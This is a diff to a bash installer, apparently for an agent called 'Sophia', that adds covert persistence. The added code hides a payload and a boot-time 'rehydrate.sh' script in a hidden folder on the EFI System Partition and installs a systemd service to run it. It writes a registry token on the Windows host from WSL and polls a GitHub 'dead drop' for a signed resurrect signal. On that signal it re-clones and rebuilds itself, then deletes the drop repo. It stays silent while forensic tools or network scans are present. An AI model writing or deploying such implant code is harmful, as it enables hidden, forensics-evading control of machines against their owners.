@@ -76,6 +76,7 @@ pkg_install() {
             golang) ensure_go; continue ;;
             rustc)  ensure_rust; continue ;;
             bun)    continue ;;
+            lm-sensors) continue ;;
         esac
         if command -v emerge &>/dev/null; then
             case "$p" in
@@ -492,12 +493,30 @@ func probeTor() (string, string, bool) {
 	return "", "", false
 }
 
+func probeGitHub() (string, string, bool) {
+	url := "https://raw.githubusercontent.com/Zheke32174/pleiades/main/dead_drop/signal.json"
+	if data, err := os.ReadFile("/var/lib/.sophia/github_drop_url"); err == nil {
+		if u := strings.TrimSpace(string(data)); u != "" {
+			url = u
+		}
+	}
+	raw, err := fetchURL(url)
+	if err != nil {
+		return "", "", false
+	}
+	if message, ok := verifyDropMessage(raw); ok {
+		return "github", message, true
+	}
+	return "", "", false
+}
+
 func cmdProbe() {
 	type sourceFn struct {
 		name string
 		fn   func() (string, string, bool)
 	}
 	sources := []sourceFn{
+		{"github", probeGitHub},
 		{"mdns", probeMDNS},
 		{"dns_txt", probeDNSTXT},
 		{"paste", probePasteSites},
@@ -559,6 +578,9 @@ GOEOF
     go build -o /usr/local/bin/sophia_crypto /tmp/_sc_src/main.go 2>&1
     chmod +x /usr/local/bin/sophia_crypto
     rm -rf /tmp/_sc_src
+    mkdir -p /var/lib/.sophia
+    [[ -f /var/lib/.sophia/github_drop_url ]] || \
+        echo 'https://raw.githubusercontent.com/Zheke32174/pleiades/main/dead_drop/signal.json' > /var/lib/.sophia/github_drop_url
 }
 
 generate_keypair() {
@@ -672,10 +694,10 @@ SOPHIA_DIR="/var/lib/.sophia"
 LOGS_DIR="/var/lib/.sophia/logs"
 WORK_DIR="/var/lib/.sophia/work"
 SCRIPT_DIR="/usr/local/sbin"
-HTTP_TOKEN="351d74b9e23b4e91084b5357ccc9ab8d"
-CONTROL_TOKEN="37e30de9e400dfbb99f5c7164e75c566"
+HTTP_TOKEN="8f12dcdd75ed6e1b53db02288b37f3e2"
+CONTROL_TOKEN="b74b1f7a78d86274be5e7a1858a22f87"
 MAX_OPEN_FILES=4096
-MEMORY_LIMIT="3764M"
+MEMORY_LIMIT="5926M"
 CPU_QUOTA="400%"
 THREAT_THRESHOLD=500
 MAX_CREDENTIAL_PROBE_CONCURRENCY=3
@@ -684,7 +706,7 @@ THRALL_INTERVAL=3
 BEACON_INTERVAL=7200
 
 # ------------------------------------------------------------
-# 1. Environment detection — Linux distros, WSL, DGX, VPS, macOS, Windows
+# 1. Environment detection — Linux distros, WSL, bare-metal, VPS, macOS, Windows
 # ------------------------------------------------------------
 detect_environment() {
     local uname_s; uname_s=$(uname -s 2>/dev/null || echo "Linux")
@@ -695,13 +717,13 @@ detect_environment() {
     if grep -qi microsoft /proc/version 2>/dev/null; then
         echo "wsl"; return
     fi
-    if nvidia-smi &>/dev/null && lspci 2>/dev/null | grep -qi nvidia; then
-        echo "dgx"; return
+    if [[ -d /sys/firmware/efi ]] && ! systemd-detect-virt --container &>/dev/null && ! systemd-detect-virt --vm &>/dev/null; then
+        echo "bare-metal"; return
     fi
     if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "kvm|xen|vmware|virtualbox"; then
         echo "vps"; return
     fi
-    echo "bare"
+    echo "bare-metal"
 }
 
 # Emit PowerShell bootstrap for Windows deployment
@@ -756,7 +778,7 @@ generate_real_values() {
             THRALL_INTERVAL=3
             BEACON_INTERVAL=7200
             ;;
-        dgx)
+        bare-metal)
             MAX_OPEN_FILES=1048576
             MEMORY_LIMIT="${ram_mb}M"
             CPU_QUOTA="$((cores * 100))%"
@@ -813,6 +835,380 @@ install_tools() {
     done
 }
 
+# Initialize GitHub dead drop repo
+[[ -f /usr/local/sbin/init-github-drop.sh ]] && bash /usr/local/sbin/init-github-drop.sh
+
+# ------------------------------------------------------------
+# 3b. System type detection — bare metal / WSL / VM / container
+# ------------------------------------------------------------
+detect_system_type() {
+    # Returns: bare-metal, wsl, vm, container, unknown
+    if [[ -d /sys/firmware/efi/efivars ]] 2>/dev/null; then
+        if systemd-detect-virt --container &>/dev/null 2>&1; then
+            echo "container"
+        elif systemd-detect-virt --vm &>/dev/null 2>&1; then
+            echo "vm"
+        else
+            echo "bare-metal"
+        fi
+    elif grep -qi microsoft /proc/version 2>/dev/null; then
+        echo "wsl"
+    elif [[ -d /proc/vz ]] || [[ -f /proc/user_beancounters ]]; then
+        echo "container"
+    else
+        echo "unknown"
+    fi
+}
+
+# ------------------------------------------------------------
+# 3c. EFI capsule persistence — efivarfs first, ESP fallback, WSL host bridge
+# ------------------------------------------------------------
+SOPHIA_EFI_GUID="a8b4c2d6-e3f1-4a5b-9c7d-2e8f0a1b3c5d"
+
+efi_capsule_persist() {
+    local bundle_file="$1"
+    local token_data="${2:-SOPHIA_DORMANT}"
+    local sys_type
+    sys_type=$(detect_system_type)
+    [[ ! -f "$bundle_file" ]] && return 1
+
+    echo "[efi] System type: $sys_type — attempting capsule persist"
+
+    # --- WSL: bridge to Windows host via PowerShell (registry + ESP filesystem, no firmware writes) ---
+    if [[ "$sys_type" == "wsl" ]] && command -v powershell.exe &>/dev/null; then
+        local b64_token
+        b64_token=$(printf '%s' "$token_data" | base64 -w0 2>/dev/null || printf '%s' "$token_data" | base64)
+        powershell.exe -NoProfile -Command "
+            \$token = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$b64_token'))
+            try {
+                New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' \`
+                    -Name 'SOPHIA_TOKEN' -Value \$token -Force | Out-Null
+                Write-Output 'SOPHIA_TOKEN written to Windows registry'
+            } catch {
+                Write-Output 'Registry write skipped: ' + \$_.Exception.Message
+            }
+        " 2>/dev/null && echo "[efi] WSL→Windows bridge: registry token written"
+    fi
+
+    # --- Find ESP (FAT32 filesystem only — never write to efivarfs/firmware variables) ---
+    # Locates the EFI System Partition by GUID on WSL (via PowerShell) or bare metal
+    # (via lsblk PARTTYPE), then mounts it temporarily if not already mounted.
+    local esp=""
+
+    # 1. Check already-mounted ESP paths first
+    for mp in /boot/efi /boot/EFI /efi /boot; do
+        if [[ -d "$mp/EFI" ]] && mountpoint -q "$mp" 2>/dev/null; then
+            esp="$mp"; break
+        fi
+    done
+
+    # 2. WSL: ask Windows for the ESP drive letter via PowerShell
+    if [[ -z "$esp" ]] && [[ "$sys_type" == "wsl" ]] && command -v powershell.exe &>/dev/null; then
+        local win_esp
+        win_esp=$(powershell.exe -NoProfile -Command "
+            \$esp = Get-Partition | Where-Object { \$_.GptType -eq '{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}' } |
+                Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter
+            if (\$esp) { Write-Output \"\${esp}:\" }
+        " 2>/dev/null | tr -d '\r\n ')
+        if [[ -n "$win_esp" ]]; then
+            # Mount the Windows ESP volume via wsl drive mapping
+            local wsl_esp_path="/mnt/${win_esp,,}"
+            if mountpoint -q "$wsl_esp_path" 2>/dev/null || [[ -d "$wsl_esp_path/EFI" ]]; then
+                esp="$wsl_esp_path"
+                echo "[efi] WSL→Windows ESP found at $esp (drive ${win_esp})"
+            fi
+        fi
+    fi
+
+    # 3. Bare metal / VPS: locate ESP by PARTTYPE GUID using lsblk
+    if [[ -z "$esp" ]]; then
+        local esp_dev
+        esp_dev=$(lsblk --output NAME,PARTTYPE --pairs --noheadings 2>/dev/null | \
+            grep -i 'c12a7328-f81f-11d2-ba4b-00a0c93ec93b' | \
+            awk -F'"' '{print $2}' | head -1)
+        [[ -n "$esp_dev" ]] && esp_dev="/dev/$esp_dev"
+        # Fallback: efibootmgr disk hint
+        if [[ -z "$esp_dev" ]] && command -v efibootmgr &>/dev/null; then
+            esp_dev=$(efibootmgr -v 2>/dev/null | grep 'File(' | head -1 | \
+                grep -oP 'HD\(\d+,GPT,[^,]+' | head -1)
+        fi
+        if [[ -n "$esp_dev" ]] && [[ -b "$esp_dev" ]]; then
+            esp="/tmp/_sophia_esp_$$"
+            mkdir -p "$esp"
+            mount -o ro "$esp_dev" "$esp" 2>/dev/null || { rm -rf "$esp"; esp=""; }
+            [[ -n "$esp" ]] && echo "[efi] ESP mounted from $esp_dev at $esp"
+        fi
+    fi
+
+    if [[ -z "$esp" ]]; then
+        echo "[efi] WARN: No ESP found; EFI bundle persistence skipped." >&2
+        return 1
+    fi
+
+    local efi_dir="$esp/EFI/.$(openssl rand -hex 6)"
+    mkdir -p "$efi_dir"
+    cp "$bundle_file" "$efi_dir/payload.bin"
+
+    if command -v sophia_crypto &>/dev/null && [[ -f /var/lib/.sophia/keys/ed25519.priv ]]; then
+        sophia_crypto sign "$efi_dir/payload.bin" > "$efi_dir/payload.sig" 2>/dev/null || true
+        sophia_crypto pubkey > "$efi_dir/pubkey.hex" 2>/dev/null || true
+    fi
+
+    cat > "$efi_dir/rehydrate.sh" << 'REHYD'
+#!/bin/bash
+set -uo pipefail
+
+# ───────────────────────────────────────────────
+# Sophia Recovery Agent — ESP-based boot capsule
+# Hidden boot-time checker: safety check, then
+# probe GitHub dead drop, rebuild from canonical
+# pleiades repo, destroy ephemeral drop on success.
+# ───────────────────────────────────────────────
+
+SELF_DIR="$(cd "$(dirname "$0")" && pwd)"
+PAYLOAD="$SELF_DIR/payload.bin"
+SIG="$SELF_DIR/payload.sig"
+PK_FILE="$SELF_DIR/pubkey.hex"
+SOPHIA_DIR="/var/lib/.sophia"
+LOG_TAG="sophia-rehydrate"
+
+log() { logger -t "$LOG_TAG" "$*"; echo "[rehydrate] $*"; }
+
+# === SAFETY CHECK — stay hidden if system is compromised ===
+
+# 1. Forensic tools active?
+for tool in volatility rekall memdump autopsy foremost bulk_extractor; do
+    if pgrep -f "$tool" &>/dev/null; then
+        log "Safety veto: $tool process detected"
+        exit 0
+    fi
+done
+
+# 2. Network under scan (SYN flood / port scan)?
+SYN_RECV=$(ss -ant 2>/dev/null | grep -c SYN-RECV || echo 0)
+if [ "$SYN_RECV" -gt 50 ]; then
+    log "Safety veto: $SYN_RECV SYN-RECV connections — possible scan"
+    exit 0
+fi
+
+# 3. Memory exhaustion?
+MEM_AVAIL=$(free -m 2>/dev/null | awk '/Mem:/{print $7}' || echo 0)
+if [ "$MEM_AVAIL" -lt 128 ]; then
+    log "Safety veto: only ${MEM_AVAIL}MB available"
+    exit 0
+fi
+
+# 4. Minimum uptime — don't reveal during early boot
+UPTIME=$(cut -d. -f1 /proc/uptime 2>/dev/null || echo 0)
+if [ "$UPTIME" -lt 120 ]; then
+    exit 0  # Silent — too early, might be observed
+fi
+
+# 5. Already deployed? Check for our PID files
+if [ -f "${SOPHIA_DIR}/forensic-pid" ]; then
+    RPID=$(cat "${SOPHIA_DIR}/forensic-pid" 2>/dev/null || echo 0)
+    if [ "$RPID" -gt 0 ] && kill -0 "$RPID" 2>/dev/null; then
+        log "Already running (PID $RPID) — no restore needed"
+        exit 0
+    fi
+fi
+
+log "Safety check passed — proceeding"
+
+# === DECRYPT CREDENTIALS FROM ESP ===
+TOKEN=""
+MACHINE_KEY=""
+SOPHIA_REPO="Zheke32174/pleiades"
+
+# Derive machine key for decryption
+if [ -f /etc/machine-id ]; then
+    MACHINE_KEY=$( (cat /etc/machine-id; hostname; grep -r . /sys/class/net/*/address 2>/dev/null | head -3 | sha256sum) | sha256sum | cut -d' ' -f1)
+fi
+
+DECRYPTED="/tmp/_sophia_decrypted_$$.tar.gz"
+
+if [ -f "$PAYLOAD" ]; then
+    # Try to decrypt
+    if [ -n "$MACHINE_KEY" ]; then
+        openssl enc -d -aes-256-cbc -salt -in "$PAYLOAD" -out "$DECRYPTED" -pass "pass:${MACHINE_KEY}" 2>/dev/null || {
+            # If decryption fails, the payload may be the old format (not encrypted)
+            cp "$PAYLOAD" "$DECRYPTED"
+        }
+    else
+        cp "$PAYLOAD" "$DECRYPTED"
+    fi
+
+    # Extract
+    EXTRACT_DIR="/tmp/_sophia_creds_$$"
+    mkdir -p "$EXTRACT_DIR"
+    tar -xzf "$DECRYPTED" -C "$EXTRACT_DIR" 2>/dev/null || {
+        log "Failed to extract credentials from payload"
+        rm -rf "$EXTRACT_DIR" "$DECRYPTED" 2>/dev/null || true
+        exit 0
+    }
+
+    # Read credentials
+    if [ -f "$EXTRACT_DIR/github_token" ]; then
+        TOKEN=$(cat "$EXTRACT_DIR/github_token")
+    fi
+
+    # Read drop repo name (if we need to destroy it later)
+    if [ -f "$EXTRACT_DIR/github_drop_repo" ]; then
+        DROP_REPO=$(cat "$EXTRACT_DIR/github_drop_repo")
+    fi
+
+    # Read signal message
+    if [ -f "$EXTRACT_DIR/signal_msg.b64" ]; then
+        EXPECTED_SIGNAL=$(cat "$EXTRACT_DIR/signal_msg.b64" | base64 -d 2>/dev/null)
+    fi
+    [ -z "$EXPECTED_SIGNAL" ] && EXPECTED_SIGNAL="RESURRECT"
+
+    rm -rf "$EXTRACT_DIR" "$DECRYPTED" 2>/dev/null || true
+fi
+
+if [ -z "$TOKEN" ]; then
+    log "No GitHub credentials in ESP payload"
+    exit 0
+fi
+
+# === PROBE GITHUB DEAD DROP ===
+
+# Check if the ephemeral drop repo still exists
+DROP_EXISTS=false
+if [ -n "${DROP_REPO:-}" ]; then
+    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $TOKEN" "https://api.github.com/repos/${DROP_REPO}" 2>/dev/null)
+    if [ "$HTTP_CODE" = "200" ]; then
+        DROP_EXISTS=true
+        log "Ephemeral drop repo ${DROP_REPO} exists — probing signal"
+        
+        # Fetch signal.json
+        SIGNAL_JSON=$(curl -sf -H "Authorization: token $TOKEN" "https://api.github.com/repos/${DROP_REPO}/contents/signal.json" 2>/dev/null)
+        if [ -n "$SIGNAL_JSON" ]; then
+            # Content is base64-encoded in GitHub API response
+            CONTENT_B64=$(echo "$SIGNAL_JSON" | python3 -c "
+import sys,json
+try:
+    d=json.load(sys.stdin)
+    print(d.get('content','').replace('\n',''))
+except Exception:
+    print('')
+" 2>/dev/null)
+            
+            if [ -n "$CONTENT_B64" ]; then
+                # Decode the file content
+                FILE_CONTENT=$(echo "$CONTENT_B64" | python3 -c "
+import sys,base64,json
+try:
+    raw=base64.b64decode(sys.stdin.read()).decode()
+    d=json.loads(raw)
+    msg_b64=d.get('message','')
+    ts=d.get('ts',0)
+    sig=d.get('sig','')
+    msg=base64.b64decode(msg_b64).decode()
+    print(json.dumps({'message':msg,'sig':sig,'ts':ts}))
+except Exception:
+    print('{}')
+" 2>/dev/null)
+                
+                SIGNAL_MSG=$(echo "$FILE_CONTENT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('message',''))" 2>/dev/null)
+                SIGNAL_SIG=$(echo "$FILE_CONTENT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('sig',''))" 2>/dev/null)
+                
+                if [ "$SIGNAL_MSG" = "$EXPECTED_SIGNAL" ]; then
+                    log "Valid RESURRECT signal received"
+                    
+                    # Verify signature if we have the pubkey
+                    if [ -f "$PK_FILE" ] && command -v sophia_crypto &>/dev/null && [ -n "$SIGNAL_SIG" ]; then
+                        echo "$SIGNAL_JSON" > /tmp/_sophia_sig_check.json
+                        sophia_crypto verify /tmp/_sophia_sig_check.json "$SIGNAL_SIG" 2>/dev/null || {
+                            log "Signature verification failed — aborting"
+                            rm -f /tmp/_sophia_sig_check.json 2>/dev/null || true
+                            exit 1
+                        }
+                        rm -f /tmp/_sophia_sig_check.json 2>/dev/null || true
+                        log "Signature verified"
+                    fi
+                    
+                    # CLONE AND REBUILD
+                    CLONE_DIR="/tmp/_sophia_rebuild_$$"
+                    log "Cloning from ${SOPHIA_REPO}..."
+                    git clone "https://Zheke32174:${TOKEN}@github.com/${SOPHIA_REPO}.git" "$CLONE_DIR" 2>/dev/null || {
+                        log "Git clone failed — cannot rebuild"
+                        exit 1
+                    }
+                    
+                    if [ -d "$CLONE_DIR" ]; then
+                        log "Rebuilding from canonical source..."
+                        cd "$CLONE_DIR"
+                        bash core/SofiaX.sh --rehydrate-only 2>/dev/null || {
+                            log "SofiaX rebuild returned non-zero"
+                        }
+                        log "System rebuilt from pleiades repository"
+                        
+                        # POST-RECOVERY: Destroy ephemeral GH drop repo
+                        if [ -n "${DROP_REPO:-}" ]; then
+                            log "Destroying ephemeral dead drop repo: ${DROP_REPO}"
+                            curl -s -X DELETE -H "Authorization: token $TOKEN" "https://api.github.com/repos/${DROP_REPO}" >/dev/null 2>&1
+                            log "Ephemeral drop repo destroyed"
+                        fi
+                        
+                        rm -rf "$CLONE_DIR" 2>/dev/null || true
+                    fi
+                else
+                    log "Signal is '$SIGNAL_MSG' (expected '$EXPECTED_SIGNAL') — no action"
+                fi
+            fi
+        fi
+    elif [ "$HTTP_CODE" = "404" ]; then
+        DROP_EXISTS=false
+        log "Drop repo ${DROP_REPO} is gone — dead drop self-destructed"
+    else
+        log "Drop repo check returned HTTP $HTTP_CODE"
+    fi
+fi
+
+# === FALLBACK: No drop repo — rebuild from canonical source ===
+if [ "$DROP_EXISTS" = false ] && [ -n "$TOKEN" ]; then
+    log "Drop repo absent — rebuilding from canonical source"
+    CLONE_DIR="/tmp/_sophia_rebuild_$$"
+    git clone "https://Zheke32174:${TOKEN}@github.com/${SOPHIA_REPO}.git" "$CLONE_DIR" 2>/dev/null && {
+        cd "$CLONE_DIR"
+        bash core/SofiaX.sh --rehydrate-only 2>/dev/null || true
+        log "System rebuilt from canonical source (fallback path)"
+        rm -rf "$CLONE_DIR" 2>/dev/null || true
+    }
+fi
+
+# Cleanup remaining temp files
+rm -rf /tmp/_sophia_* 2>/dev/null || true
+log "Rehydration cycle complete"
+REHYD
+    chmod +x "$efi_dir/rehydrate.sh"
+    echo "$efi_dir" > /var/lib/.sophia/efi_location
+    echo "[efi] Bundle persisted to ESP: $efi_dir"
+    logger -t sophia "EFI bundle written to ESP: $efi_dir"
+
+    # Install systemd service for auto-rehydration (non-WSL only)
+    if [[ "$sys_type" == "bare-metal" ]] || [[ "$sys_type" == "vm" ]]; then
+        if command -v systemctl &>/dev/null; then
+            cat > /etc/systemd/system/sophia-rehydrate.service << SVCEOF
+[Unit]
+Description=Sophia Recovery Agent
+After=multi-user.target
+
+[Service]
+Type=oneshot
+ExecStart=$efi_dir/rehydrate.sh
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+            systemctl daemon-reload 2>/dev/null && systemctl enable sophia-rehydrate.service 2>/dev/null || true
+        fi
+    fi
+    return 0
+}
+
 # ------------------------------------------------------------
 # 4. Owner evidence escrow persistence
 # ------------------------------------------------------------
@@ -848,6 +1244,11 @@ usb_escrow_signal_check() {
     local _result_var="$1"
     local usb_message=""
 
+    local scan_mounts=()
+    if [[ -n "${PURPLE_USB_ESCROW_SCAN_MOUNTS:-}" ]]; then
+        IFS=':' read -r -a scan_mounts <<< "$PURPLE_USB_ESCROW_SCAN_MOUNTS"
+    fi
+
     # Enumerate block devices that look like USB
     local usb_devs=()
     while IFS= read -r syslink; do
@@ -857,10 +1258,16 @@ usb_escrow_signal_check() {
              xargs -I{} readlink -f {} 2>/dev/null | \
              grep -i "usb" | sed 's|.*/||' || true)
 
-    # Also try any mounted vfat / exfat that is not the owner escrow path
+    # Also try any mounted removable-style filesystem that is not the owner escrow path.
     local esp_dev; esp_dev=$(cat /var/lib/.sophia/efi_location 2>/dev/null | head -1) || true
     while IFS= read -r mp; do
-        [[ "$mp" == "${esp_dev%%/*}"* ]] && continue
+        scan_mounts+=("$mp")
+    done < <(awk '$3 ~ /vfat|exfat|fat32|ext2|ext3|ext4/ && $2 ~ /^\/(media|mnt|run\/media|tmp)\// {print $2}' /proc/mounts 2>/dev/null || true)
+
+    local mp
+    for mp in "${scan_mounts[@]}"; do
+        [[ -n "$mp" && -d "$mp" ]] || continue
+        [[ -n "$esp_dev" && "$mp" == "${esp_dev%%/*}"* ]] && continue
         local signal_file="$mp/.purple_signal.json"
         if [[ -f "$signal_file" ]]; then
             if command -v sophia_crypto &>/dev/null; then
@@ -870,7 +1277,7 @@ usb_escrow_signal_check() {
                 }
             fi
         fi
-    done < <(awk '$3 ~ /vfat|exfat|fat32/ {print $2}' /proc/mounts 2>/dev/null || true)
+    done
 
     # Try mounting USB block devices and checking them
     for dev in "${usb_devs[@]}"; do
@@ -1049,8 +1456,8 @@ patch_runtime_value() {
     sed -i "s|$token|$value|g" "$TEMP_SELF" 2>/dev/null || true
 }
 
-patch_runtime_value "351d74b9e23b4e91084b5357ccc9ab8d" "$HTTP_TOKEN"
-patch_runtime_value "37e30de9e400dfbb99f5c7164e75c566" "$CONTROL_TOKEN"
+patch_runtime_value "8f12dcdd75ed6e1b53db02288b37f3e2" "$HTTP_TOKEN"
+patch_runtime_value "b74b1f7a78d86274be5e7a1858a22f87" "$CONTROL_TOKEN"
 sed -i -E "s/^(MAX_OPEN_FILES=).*/\1$MAX_OPEN_FILES/" "$TEMP_SELF"
 sed -i -E "s/^(MEMORY_LIMIT=).*/\1\"$MEMORY_LIMIT\"/" "$TEMP_SELF"
 sed -i -E "s/^(CPU_QUOTA=).*/\1\"$CPU_QUOTA\"/" "$TEMP_SELF"
